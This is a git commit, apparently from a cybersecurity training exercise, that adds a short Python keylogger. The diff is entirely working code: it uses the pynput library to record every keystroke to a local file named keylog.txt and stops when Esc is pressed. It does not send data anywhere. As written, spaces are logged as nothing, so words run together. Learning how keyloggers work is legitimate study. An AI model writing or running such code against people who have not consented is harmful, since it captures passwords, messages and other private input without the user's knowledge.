739f491bdd4097335f687e40b0586f8d0f604500
Athish <121789340+Athish2503@users.noreply.github.com>
2024-02-06 10:25:49 +0530

    Update Simple_Keylogger.py

--- PRODIGY_CS_04/Simple_Keylogger.py
+++ PRODIGY_CS_04/Simple_Keylogger.py
@@ -1,1 +1,25 @@
+import pynput
+from pynput.keyboard import Key, Listener
 
+log_file = "keylog.txt"
+
+def on_press(key):
+    try:
+        with open(log_file, "a") as f:
+            f.write(str(key.char))
+    except AttributeError:
+        if key == key.space:
+            with open(log_file, "a") as f:
+                f.write("")
+        
+        else:
+            with open(log_file, "a") as f:
+                f.write(f"[{str(key)}]")
+
+def on_release(key):
+    if key == Key.esc:
+
+        return False
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
